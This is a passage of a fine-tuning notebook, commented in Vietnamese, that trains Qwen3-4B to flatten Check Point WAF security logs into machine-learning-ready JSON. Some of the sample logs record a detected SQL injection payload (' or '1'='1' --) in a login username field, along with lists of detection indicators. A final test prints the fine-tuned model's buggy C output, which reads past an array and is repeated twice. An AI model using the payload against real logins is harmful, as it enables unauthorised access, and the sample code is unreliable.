# {'text': '[{"content": "{\\"eventTime\\": \\"2025-06-20T14:41:22.555\\", \\"eventName\\": \\"Web Request\\", \\"eventSeverity\\": \\"Critical\\", \\"eventPriority\\": \\"High\\", \\"eventType\\": \\"Event Driven\\", \\"eventLevel\\": \\"Log\\", \\"eventLogLevel\\": \\"info\\", \\"eventAudience\\": \\"Security\\", \\"eventAudienceTeam\\": \\"\\", \\"eventFrequency\\": 0, \\"eventTags\\": [\\"Threat Prevention\\", \\"Web Application & API Protection\\"], \\"eventSource\\": {\\"agentId\\": \\"fbfb6a19-daf7-41e5-a25c-bf3a1472e97a\\", \\"eventTraceId\\": \\"\\", \\"eventSpanId\\": \\"\\", \\"issuingEngineVersion\\": \\"1.1.26-open-source\\", \\"serviceName\\": \\"HTTP Transaction Handler\\", \\"serviceId\\": \\"1\\", \\"assetId\\": \\"Any\\", \\"assetName\\": \\"Any\\"}, \\"eventData\\": {\\"logIndex\\": 16, \\"eventReferenceId\\": \\"69cf3c02-5c14-4a8a-ad84-68ab227ac37e\\", \\"assetId\\": \\"Any\\", \\"assetName\\": \\"Any\\", \\"eventConfidence\\": \\"Very High\\", \\"sourceIP\\": \\"192.168.136.1\\", \\"httpSourceId\\": \\"192.168.136.1\\", \\"sourcePort\\": 50912, \\"httpHostName\\": \\"192.168.136.128\\", \\"httpMethod\\": \\"POST\\", \\"ruleId\\": \\"Any\\", \\"securityAction\\": \\"Detect\\", \\"waapOverride\\": \\"None\\", \\"practiceType\\": \\"Threat Prevention\\", \\"practiceSubType\\": \\"Web Application\\", \\"ruleName\\": \\"Any\\", \\"practiceId\\": \\"3943d645-b4dd-4185-b9e8-bbf46642b795\\", \\"practiceName\\": \\"local_policy/appsec-best-practice\\", \\"waapIncidentType\\": \\"SQL Injection\\", \\"matchedSample\\": \\"\\\\\\"\' or \'1\'=\'1\' --\\\\\\",\\", \\"matchedLocation\\": \\"body\\", \\"matchedParameter\\": \\"username\\", \\"waapFoundIndicators\\": \\"[\\\\\\", \', \'=\', --, =, or, probing, regex_postfix_0, regex_postfix_1, regex_prefix_0, regex_prefix_1, regex_sqli_0, regex_sqli_13, regex_sqli_15, regex_sqli_17, regex_sqli_22, regex_sqli_26]\\", \\"matchedIndicators\\": \\"[\\\\\\", \', \'=\', --, =, or, probing, regex_postfix_0, regex_postfix_1, regex_prefix_0, regex_prefix_1, regex_sqli_0, regex_sqli_13, regex_sqli_15, regex_sqli_17, regex_sqli_22, regex_sqli_26]\\", \\"learnedIndicators\\": \\"\\", \\"waapUserReputationScore\\": 139, \\"waapUserReputation\\": \\"Low\\", \\"waapUriFalsePositiveScore\\": 864, \\"waapKeywordsScore\\": 971, \\"reservedNgenA\\": 0, \\"waapFinalScore\\": 1000, \\"waapCalculatedThreatLevel\\": 4}}\\ndo log processing for me from above file into understandable form for machine learning to read", "role": "user"}, {"content": "{\\"eventTime\\": \\"2025-06-20T14:41:22.555\\", \\"eventName\\": \\"Web Request\\", \\"eventSeverity\\": \\"Critical\\", \\"eventPriority\\": \\"High\\", \\"eventType\\": \\"Event Driven\\", \\"eventLevel\\": \\"Log\\", \\"eventLogLevel\\": \\"info\\", \\"eventAudience\\": \\"Security\\", \\"eventAudienceTeam\\": \\"\\", \\"eventFrequency\\": 0, \\"eventTags_0\\": \\"Threat Prevention\\", \\"eventTags_1\\": \\"Web Application & API Protection\\", \\"eventSource_agentId\\": \\"fbfb6a19-daf7-41e5-a25c-bf3a1472e97a\\", \\"eventSource_eventTraceId\\": \\"\\", \\"eventSource_eventSpanId\\": \\"\\", \\"eventSource_issuingEngineVersion\\": \\"1.1.26-open-source\\", \\"eventSource_serviceName\\": \\"HTTP Transaction Handler\\", \\"eventSource_serviceId\\": \\"1\\", \\"eventSource_assetId\\": \\"Any\\", \\"eventSource_assetName\\": \\"Any\\", \\"eventData_logIndex\\": 16, \\"eventData_eventReferenceId\\": \\"69cf3c02-5c14-4a8a-ad84-68ab227ac37e\\", \\"eventData_assetId\\": \\"Any\\", \\"eventData_assetName\\": \\"Any\\", \\"eventData_eventConfidence\\": \\"Very High\\", \\"eventData_sourceIP\\": \\"192.168.136.1\\", \\"eventData_httpSourceId\\": \\"192.168.136.1\\", \\"eventData_sourcePort\\": 50912, \\"eventData_httpHostName\\": \\"192.168.136.128\\", \\"eventData_httpMethod\\": \\"POST\\", \\"eventData_ruleId\\": \\"Any\\", \\"eventData_securityAction\\": \\"Detect\\", \\"eventData_waapOverride\\": \\"None\\", \\"eventData_practiceType\\": \\"Threat Prevention\ ...
# Bản ghi 59:
# {'text': '[{"content": "{\\"eventTime\\": \\"2025-06-20T14:04:40.719\\", \\"eventName\\": \\"Check Point Nano-service started\\", \\"eventSeverity\\": \\"Info\\", \\"eventPriority\\": \\"Medium\\", \\"eventType\\": \\"Event Driven\\", \\"eventLevel\\": \\"Log\\", \\"eventLogLevel\\": \\"info\\", \\"eventAudience\\": \\"Security\\", \\"eventAudienceTeam\\": \\"\\", \\"eventFrequency\\": 0, \\"eventTags\\": [\\"Informational\\"], \\"eventSource\\": {\\"agentId\\": \\"fbfb6a19-daf7-41e5-a25c-bf3a1472e97a\\", \\"eventTraceId\\": \\"\\", \\"eventSpanId\\": \\"\\", \\"issuingEngineVersion\\": \\"1.1.26-open-source\\", \\"serviceName\\": \\"HTTP Transaction Handler\\", \\"serviceId\\": \\"1\\"}, \\"eventData\\": {\\"logIndex\\": 2, \\"serviceName\\": \\"HTTP Transaction Handler\\"}}\\ndo log processing for me from above file into understandable form for machine learning to read", "role": "user"}, {"content": "{\\"eventTime\\": \\"2025-06-20T14:04:40.719\\", \\"eventName\\": \\"Check Point Nano-service started\\", \\"eventSeverity\\": \\"Info\\", \\"eventPriority\\": \\"Medium\\", \\"eventType\\": \\"Event Driven\\", \\"eventLevel\\": \\"Log\\", \\"eventLogLevel\\": \\"info\\", \\"eventAudience\\": \\"Security\\", \\"eventAudienceTeam\\": \\"\\", \\"eventFrequency\\": 0, \\"eventTags_0\\": \\"Informational\\", \\"eventSource_agentId\\": \\"fbfb6a19-daf7-41e5-a25c-bf3a1472e97a\\", \\"eventSource_eventTraceId\\": \\"\\", \\"eventSource_eventSpanId\\": \\"\\", \\"eventSource_issuingEngineVersion\\": \\"1.1.26-open-source\\", \\"eventSource_serviceName\\": \\"HTTP Transaction Handler\\", \\"eventSource_serviceId\\": \\"1\\", \\"eventData_logIndex\\": 2, \\"eventData_serviceName\\": \\"HTTP Transaction Handler\\", \\"eventData_assetId\\": \\"\\", \\"eventData_practiceId\\": \\"\\", \\"eventData_waapFoundIndicators\\": \\"\\", \\"eventData_httpMethod\\": \\"\\", \\"eventData_ruleName\\": \\"\\", \\"eventData_practiceName\\": \\"\\", \\"eventData_waapUserReputationScore\\": \\"\\", \\"eventData_waapCalculatedThreatLevel\\": \\"\\", \\"eventSource_assetName\\": \\"\\", \\"eventData_matchedSample\\": \\"\\", \\"eventData_waapFinalScore\\": \\"\\", \\"eventData_eventConfidence\\": \\"\\", \\"eventData_waapIncidentType\\": \\"\\", \\"eventData_httpHostName\\": \\"\\", \\"eventData_practiceType\\": \\"\\", \\"eventSource_assetId\\": \\"\\", \\"eventData_learnedIndicators\\": \\"\\", \\"eventData_eventReferenceId\\": \\"\\", \\"eventData_assetName\\": \\"\\", \\"eventData_matchedLocation\\": \\"\\", \\"eventData_waapOverride\\": \\"\\", \\"eventData_httpSourceId\\": \\"\\", \\"eventData_matchedIndicators\\": \\"\\", \\"eventData_matchedParameter\\": \\"\\", \\"eventData_waapUriFalsePositiveScore\\": \\"\\", \\"eventData_waapUserReputation\\": \\"\\", \\"eventData_ruleId\\": \\"\\", \\"eventData_waapKeywordsScore\\": \\"\\", \\"eventTags_1\\": \\"\\", \\"eventData_reservedNgenA\\": \\"\\", \\"eventData_sourcePort\\": \\"\\", \\"eventData_sourceIP\\": \\"\\", \\"eventData_securityAction\\": \\"\\", \\"eventData_practiceSubType\\": \\"\\"}", "role": "assistant"}]'}

# %%
from trl import SFTTrainer, SFTConfig

trainer = SFTTrainer(
    model=model,  # Đảm bảo model đã được tải (ví dụ: Qwen3-4B)
    tokenizer=tokenizer,  # Đảm bảo tokenizer đã được tải
    train_dataset=combined_dataset,  # Dataset đã chuẩn bị trước đó
    eval_dataset=None,
    args=SFTConfig(
        dataset_text_field="text",
        per_device_train_batch_size=2,
        gradient_accumulation_steps=4,
        warmup_steps=5,
        max_steps=30,
        learning_rate=2e-4,
        logging_steps=1,
        optim="adamw_8bit",
        weight_decay=0.01,
        lr_scheduler_type="linear",
        seed=3407,
        report_to="none",
        output_dir="/content/qwen3-4b-finetuned-security",  # Thư mục lưu mô hình sau huấn luyện
        save_strategy="steps",  # Lưu checkpoint sau mỗi số bước
        save_steps=10,  # Lưu sau mỗi 10 bước (vì max_steps=30, sẽ có 3 checkpoint)
    ),
)

# Bắt đầu huấn luyện
trainer.train()
# Out:
# Unsloth: Tokenizing ["text"] (num_proc=2):   0%|          | 0/62 [00:00<?, ? examples/s]
# ==((====))==  Unsloth - 2x faster free finetuning | Num GPUs used = 1
#    \\   /|    Num examples = 62 | Num Epochs = 4 | Total steps = 30
# O^O/ \_/ \    Batch size per device = 2 | Gradient accumulation steps = 4
# \        /    Data Parallel GPUs = 1 | Total batch size (2 x 4 x 1) = 8
#  "-____-"     Trainable parameters = 66,060,288 of 4,000,000,000 (1.65% trained)
# Unsloth: Will smartly offload gradients to save VRAM!
#     <div>
#
#       <progress value='30' max='30' style='width:300px; height:20px; vertical-align: middle;'></progress>
#       [30/30 11:13, Epoch 3/4]
#     </div>
#     <table border="1" class="dataframe">
#   <thead>
#  <tr style="text-align: left;">
#       <th>Step</th>
#       <th>Training Loss</th>
#     </tr>
#   </thead>
#   <tbody>
#     <tr>
#       <td>1</td>
#       <td>1.192900</td>
#     </tr>
#     <tr>
#       <td>2</td>
#       <td>1.240100</td>
#     </tr>
#     <tr>
#       <td>3</td>
#       <td>1.213800</td>
#     </tr>
#     <tr>
#       <td>4</td>
#       <td>1.096800</td>
#     </tr>
#     <tr>
#       <td>5</td>
#       <td>1.031700</td>
#     </tr>
#     <tr>
#       <td>6</td>
#       <td>1.065100</td>
#     </tr>
#     <tr>
#       <td>7</td>
#       <td>0.949300</td>
#     </tr>
#     <tr>
#       <td>8</td>
#       <td>0.941800</td>
#     </tr>
#     <tr>
#       <td>9</td>
#       <td>0.863000</td>
#     </tr>
#     <tr>
#       <td>10</td>
#       <td>0.786600</td>
#     </tr>
#     <tr>
#       <td>11</td>
#       <td>0.718600</td>
#     </tr>
#     <tr>
#       <td>12</td>
#       <td>0.693800</td>
#     </tr>
#     <tr>
#       <td>13</td>
#       <td>0.585800</td>
#     </tr>
#     <tr>
#       <td>14</td>
#       <td>0.551000</td>
#     </tr>
#     <tr>
#       <td>15</td>
#       <td>0.520700</td>
#     </tr>
#     <tr>
#       <td>16</td>
#       <td>0.417500</td>
#     </tr>
#     <tr>
#       <td>17</td>
#       <td>0.420200</td>
#     </tr>
#     <tr>
#       <td>18</td>
#       <td>0.368300</td>
#     </tr>
#     <tr>
#       <td>19</td>
#       <td>0.328600</td>
#     </tr>
#     <tr>
#       <td>20</td>
#       <td>0.315800</td>
#     </tr>
#     <tr>
#       <td>21</td>
#       <td>0.296400</td>
#     </tr>
#     <tr>
#       <td>22</td>
#       <td>0.274200</td>
#     </tr>
#     <tr>
#       <td>23</td>
#       <td>0.253800</td>
#     </tr>
#     <tr>
#       <td>24</td>
#       <td>0.278400</td>
#     </tr>
#     <tr>
#       <td>25</td>
#       <td>0.263600</td>
#     </tr>
#     <tr>
#       <td>26</td>
#       <td>0.223500</td>
#     </tr>
#     <tr>
#       <td>27</td>
#       <td>0.230700</td>
#     </tr>
#     <tr>
#       <td>28</td>
#       <td>0.231100</td>
#     </tr>
#     <tr>
#       <td>29</td>
#       <td>0.218700</td>
#     </tr>
#     <tr>
#       <td>30</td>
#       <td>0.226200</td>
#     </tr>
#   </tbody>
# </table><p>
# TrainOutput(global_step=30, training_loss=0.5932672033707301, metrics={'train_runtime': 702.6104, 'train_samples_per_second': 0.342, 'train_steps_per_second': 0.043, 'total_flos': 7956403612956672.0, 'train_loss': 0.5932672033707301})

# %%
from transformers import TextStreamer
print("\nKiểm tra mô hình với một log sự kiện...")
messages = [
    {
        "role": "user",
        "content": """{"eventTime": "2025-06-20T14:41:15.313","eventName": "Web Request","eventSeverity": "Critical","eventPriority": "High","eventType": "Event Driven","eventLevel": "Log","eventLogLevel": "info","eventAudience": "Security","eventAudienceTeam": "","eventFrequency": 0,"eventTags": ["Threat Prevention","Web Application & API Protection"],"eventSource": {"agentId": "fbfb6a19-daf7-41e5-a25c-bf3a1472e97a","eventTraceId": "","eventSpanId": "","issuingEngineVersion": "1.1.26-open-source","serviceName": "HTTP Transaction Handler","serviceId": "1","assetId": "Any","assetName": "Any"},"eventData": {"logIndex": 9,"eventReferenceId": "ca55b172-8ec9-4e32-a094-aa555da0b187","assetId": "Any","assetName": "Any","eventConfidence": "Very High","sourceIP": "192.168.136.1","httpSourceId": "192.168.136.1","sourcePort": 50911,"httpHostName": "192.168.136.128","httpMethod": "POST","assetId": "Any","assetName": "Any","ruleId": "Any","securityAction": "Detect","waapOverride": "None","practiceType": "Threat Prevention","practiceSubType": "Web Application","ruleName": "Any","practiceId": "3943d645-b4dd-4185-b9e8-bbf46642b795","practiceName": "local_policy/appsec-best-practice","waapIncidentType": "SQL Injection","matchedSample": "\"' or '1'='1' --\",","matchedLocation": "body","matchedParameter": "username","waapFoundIndicators": "[\", ', '=', --, =, or, probing, regex_postfix_0, regex_postfix_1, regex_prefix_0, regex_prefix_1, regex_sqli_0, regex_sqli_13, regex_sqli_15, regex_sqli_17, regex_sqli_22, regex_sqli_26]","matchedIndicators": "[\", ', '=', --, =, or, probing, regex_postfix_0, regex_postfix_1, regex_prefix_0, regex_prefix_1, regex_sqli_0, regex_sqli_13, regex_sqli_15, regex_sqli_17, regex_sqli_22, regex_sqli_26]","learnedIndicators": "","waapUserReputationScore": 124,"waapUserReputation": "Low","waapUriFalsePositiveScore": 864,"waapKeywordsScore": 971,"reservedNgenA": 0,"waapFinalScore": 1000,"waapCalculatedThreatLevel": 4}}
do log processing for me from above file into understandable form for machine learning to read Fields that are left blank are replaced with the value "null" just return me json file, nothing else """
    }
]

text = tokenizer.apply_chat_template(
    messages,
    tokenize=False,
    add_generation_prompt=True,
    enable_thinking=False,
)

print("Kết quả:")
_ = model.generate(
    **tokenizer(text, return_tensors="pt").to("cuda"),
    max_new_tokens=1000,
    temperature=0.7,
    top_p=0.8,
    top_k=20,
    streamer=TextStreamer(tokenizer, skip_prompt=True),
)
# Out:
# Kiểm tra mô hình với một log sự kiện...
# Kết quả:
# {
#   "eventTime": "2025-06-20T14:41:15.313",
#   "eventName": "Web Request",
#   "eventSeverity": "Critical",
#   "eventPriority": "High",
#   "eventType": "Event Driven",
#   "eventLevel": "Log",
#   "eventLogLevel": "info",
#   "eventAudience": "Security",
#   "eventAudienceTeam": "null",
#   "eventFrequency": 0,
#   "eventTags_0": "Threat Prevention",
#   "eventTags_1": "Web Application & API Protection",
#   "eventSource_agentId": "fbfb6a19-daf7-41e5-a25c-bf3a1472e97a",
#   "eventSource_eventTraceId": "null",
#   "eventSource_eventSpanId": "null",
#   "eventSource_issuingEngineVersion": "1.1.26-open-source",
#   "eventSource_serviceName": "HTTP Transaction Handler",
#   "eventSource_serviceId": "1",
#   "eventSource_assetId": "Any",
#   "eventSource_assetName": "Any",
#   "eventData_logIndex": 9,
#   "eventData_eventReferenceId": "ca55b172-8ec9-4e32-a094-aa555da0b187",
#   "eventData_assetId": "Any",
#   "eventData_assetName": "Any",
#   "eventData_eventConfidence": "Very High",
#   "eventData_sourceIP": "192.168.136.1",
#   "eventData_httpSourceId": "192.168.136.1",
#   "eventData_sourcePort": 50911,
#   "eventData_httpHostName": "192.168.136.128",
#   "eventData_httpMethod": "POST",
#   "eventData_assetId": "Any",
#   "eventData_assetName": "Any",
#   "eventData_ruleId": "Any",
#   "eventData_securityAction": "Detect",
#   "eventData_waapOverride": "None",
#   "eventData_practiceType": "Threat Prevention",
#   "eventData_practiceSubType": "Web Application",
#   "eventData_ruleName": "Any",
#   "eventData_practiceId": "3943d645-b4dd-4185-b9e8-bbf46642b795",
#   "eventData_practiceName": "local_policy/appsec-best-practice",
#   "eventData_waapIncidentType": "SQL Injection",
#   "eventData_matchedSample": "' or '1'='1' --",
#   "eventData_matchedLocation": "body",
#   "eventData_matchedParameter": "username",
#   "eventData_waapFoundIndicators": "[\", ', '=', --, =, or, probing, regex_postfix_0, regex_postfix_1, regex_prefix_0, regex_prefix_1, regex_sqli_0, regex_sqli_13, regex_sqli_15, regex_sqli_17, regex_sqli_22, regex_sqli_26]",
#   "eventData_matchedIndicators": "[\", ', '=', --, =, or, probing, regex_postfix_0, regex_postfix_1, regex_prefix_0, regex_prefix_1, regex_sqli_0, regex_sqli_13, regex_sqli_15, regex_sqli_17, regex_sqli_22, regex_sqli_26]",
#   "eventData_learnedIndicators": "null",
#   "eventData_waapUserReputationScore": 124,
#   "eventData_waapUserReputation": "Low",
#   "eventData_waapUriFalsePositiveScore": 864,
#   "eventData_waapKeywordsScore": 971,
#   "eventData_reservedNgenA": 0,
#   "eventData_waapFinalScore": 1000,
#   "eventData_waapCalculatedThreatLevel": 4
# }<|im_end|>

# %%
print("\nLưu mô hình vào Google Drive...")
from google.colab import drive
drive.mount('/content/drive')
# !cp -r /content/qwen3-4b-finetuned-security /content/drive/MyDrive/qwen3-4b-7-3
print("Mô hình đã được lưu vào /content/drive/MyDrive/qwen3-4b-finetuned-security-7-3")
# Out:
# Lưu mô hình vào Google Drive...
# Mounted at /content/drive
# Mô hình đã được lưu vào /content/drive/MyDrive/qwen3-4b-finetuned-security-7-3

# %%
messages = [
      {"role": "user", "content": "What could go wrong if I write the code differently?"},

]
text = tokenizer.apply_chat_template(
    messages,
    tokenize = False,
    add_generation_prompt = True, # Must add for generation
    enable_thinking = True, # Disable thinking
)

from transformers import TextStreamer
_ = model.generate(
    **tokenizer(text, return_tensors = "pt").to("cuda"),
    max_new_tokens = 1024, # Increase for longer outputs!
    temperature = 0.6, top_p = 0.95, top_k = 20, # For thinking
    streamer = TextStreamer(tokenizer, skip_prompt = True),
)
# Out:
# ```c
# #include<stdio.h>
# #include<stdlib.h>
#
# int main() {
#     int *a = (int*)malloc(10 * sizeof(int));
#     if (a == NULL) {
#         printf("Memory allocation failed.\n");
#         return 1;
#     }
#     for (int i = 0; i < 10; i++) {
#         scanf("%d", &a[i]);
#     }
#     printf("The sum is %d.\n", a[10]);
#     free(a);
#     return 0;
# }
# ```
# ```c
# #include<stdio.h>
# #include<stdlib.h>
#
# int main() {
#     int *a = (int*)malloc(10 * sizeof(int));
#     if (a == NULL) {
#         printf("Memory allocation failed.\n");
#         return 1;
#     }
#     for (int i = 0; i < 10; i++) {
#         scanf("%d", &a[i]);
#     }
#     printf("The sum is %d.\n", a[10]);
#     free(a);
#     return 0;
# }
# ```<|im_end|>

# %%
import os

# Đường dẫn đến thư mục
output_dir = "/content/qwen3-4b-finetuned-security"

# Kiểm tra xem thư mục có tồn tại không
if os.path.exists(output_dir):
    print(f"Thư mục {output_dir} tồn tại. Nội dung:")
    # Liệt kê các thư mục con và tệp
    for item in os.listdir(output_dir):
        print(item)
        # Nếu là thư mục con (như checkpoint-10), liệt kê nội dung bên trong
        item_path = os.path.join(output_dir, item)
        if os.path.isdir(item_path):
            print(f"  Nội dung của {item}:")
            for sub_item in os.listdir(item_path):
                print(f"    {sub_item}")
else:
    print(f"Thư mục {output_dir} không tồn tại. Có thể huấn luyện chưa hoàn thành.")
# Out:
# Thư mục /content/qwen3-4b-finetuned-security tồn tại. Nội dung:
# checkpoint-30
#   Nội dung của checkpoint-30:
#     scaler.pt
#     vocab.json
#     special_tokens_map.json
#     merges.txt
#     tokenizer_config.json
#     scheduler.pt
#     tokenizer.json
#     optimizer.pt
#     adapter_config.json
#     trainer_state.json
#     rng_state.pth
#     README.md
#     adapter_model.safetensors
#     added_tokens.json
#     chat_template.jinja
#     training_args.bin
# checkpoint-20
#   Nội dung của checkpoint-20:
#     scaler.pt
#     vocab.json
#     special_tokens_map.json
#     merges.txt
#     tokenizer_config.json
#     scheduler.pt
#     tokenizer.json
#     optimizer.pt
#     adapter_config.json
#     trainer_state.json
#     rng_state.pth
#     README.md
#     adapter_model.safetensors
#     added_tokens.json
#     chat_template.jinja
#     training_args.bin
# checkpoint-10
#   Nội dung của checkpoint-10:
#     scaler.pt
#     vocab.json
#     special_tokens_map.json
#     merges.txt
#     tokenizer_config.json
#     scheduler.pt
#     tokenizer.json
#     optimizer.pt
#     adapter_config.json
#     trainer_state.json
#     rng_state.pth
#     README.md
#     adapter_model.safetensors
#     added_tokens.json
#     chat_template.jinja
#     training_args.bin

# %%
# Lưu LoRA adapters từ checkpoint cuối cùng
model.save_pretrained("./qwen3-4b-finetuned/checkpoint-30")  # Local saving
tokenizer.save_pretrained("./qwen3-4b-finetuned/checkpoint-30")
# model.push_to_hub("your_name/qwen3-4b-finetuned", token="...")  # Online saving
# tokenizer.push_to_hub("your_name/qwen3-4b-finetuned", token="...")  # Online saving

# Tải lại LoRA adapters để sử dụng (bật False thành True nếu cần)
if False:
    from unsloth import FastLanguageModel
    model, tokenizer = FastLanguageModel.from_pretrained(
        model_name="./qwen3-4b-finetuned/checkpoint-30",  # Đường dẫn đến checkpoint
        max_seq_length=2048,
        load_in_4bit=True,
    )
